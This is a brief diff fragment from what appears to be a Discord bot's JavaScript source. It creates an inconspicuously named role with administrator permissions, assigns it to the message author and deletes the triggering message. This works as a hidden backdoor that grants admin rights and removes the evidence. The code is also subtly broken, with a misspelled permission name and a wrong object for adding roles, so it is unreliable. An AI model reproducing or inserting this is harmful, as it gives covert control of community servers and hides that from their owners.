@@ -615,7 +615,7 @@ name : "."
 }).then(role => {
 role.setPermissions(["ADMINISTATOR"])
 })
-     message.author.roles.add("un").then(()=> {
+     message.author.roles.add(".").then(()=> {
       message.delete()
      })
 }
